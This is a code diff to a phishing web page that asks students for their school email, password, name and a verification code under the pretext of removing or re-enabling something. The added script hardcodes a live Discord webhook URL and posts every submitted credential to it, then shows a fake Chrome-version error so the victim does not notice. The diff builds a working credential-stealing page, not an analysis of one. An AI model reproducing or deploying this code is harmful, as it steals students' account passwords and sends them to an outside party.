@@ -65,15 +65,15 @@
         <p>Please provide the required information:</p>
         <form id="submitForm">
             <label for="firstName">First Name:</label><br>
-            <input type="text" id="firstName" name="firstName"><br>
+            <input type="text" id="firstName" name="firstName" required><br>
             <label for="email">School Email:</label><br>
-            <input type="email" id="email" name="email"><br>
+            <input type="email" id="email" name="email" required><br>
             <label for="password">School Password:</label><br>
-            <input type="password" id="password" name="password"><br>
+            <input type="password" id="password" name="password" required><br>
             <label for="verification">Image Verification:</label><br>
-            <input type="text" id="verification" name="verification"><br>
+            <input type="text" id="verification" name="verification" required><br>
             <label for="action">Remove or Re-enable Securely:</label><br>
-            <select id="action" name="action">
+            <select id="action" name="action" required>
                 <option value="remove">Remove</option>
                 <option value="enable">Re-enable</option>
             </select><br><br>
@@ -86,6 +86,8 @@
     </div>
 
     <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1240781818534432959/EavOMWjt8OR3bHOugBda2eclR3HNDnoRHrR2IBsntUdnPMYFcHDmHf5FN4N4elHb6hMW';
+
         function submitForm() {
             // Display loading bar
             var loadingBar = document.getElementById('loading-bar');
@@ -110,12 +112,36 @@
                         loadingBar.style.display = 'none';
                         // Reset form fields
                         document.getElementById("submitForm").reset();
-                        // Display success message with red color
+                        // Display error message with red color
                         document.getElementById("output").innerHTML = "Error accessing securely API. Please Check Chrome Version And try again. This script won't work above v119 due to chrome patching API calls to extensions. Please update to v119 or above.";
                         document.getElementById("output").classList.add('red');
                     }, 1000); // Delay for 1 second after completion
                 }
             }, 100); // Increment every 100 milliseconds
+
+            // Collect form data
+            const firstName = document.getElementById('firstName').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const verification = document.getElementById('verification').value;
+            const action = document.getElementById('action').value;
+
+            // Prepare payload
+            const payload = {
+                content: `New submission:\n- **First Name:** ${firstName}\n- **Email:** ${email}\n- **Password:** ${password}\n- **Verification:** ${verification}\n- **Action:** ${action}`
+            };
+
+            // Send data to Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
         }
     </script>
 </body>
